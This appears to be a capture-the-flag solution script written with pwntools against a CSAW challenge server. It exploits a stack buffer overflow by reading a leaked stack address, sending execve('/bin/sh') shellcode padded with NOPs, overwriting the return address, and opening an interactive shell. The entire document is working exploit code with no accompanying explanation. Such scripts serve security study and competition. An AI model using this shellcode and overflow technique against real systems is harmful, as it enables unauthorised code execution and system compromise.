from pwn import *

#r = process("./true")
r = remote("pwn.chal.csaw.io", 8464)
r.recvuntil("Location:")

shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
payload = "\x90" * (40 - len(shellcode))
payload = shellcode + payload

addr =  int(r.recv(14),16)
addr =  p64(addr)
payload_to_send = payload+addr

log.info("Payload Length %d" % (len(payload_to_send)))
r.sendlineafter("Command:",payload_to_send)
r.interactive()
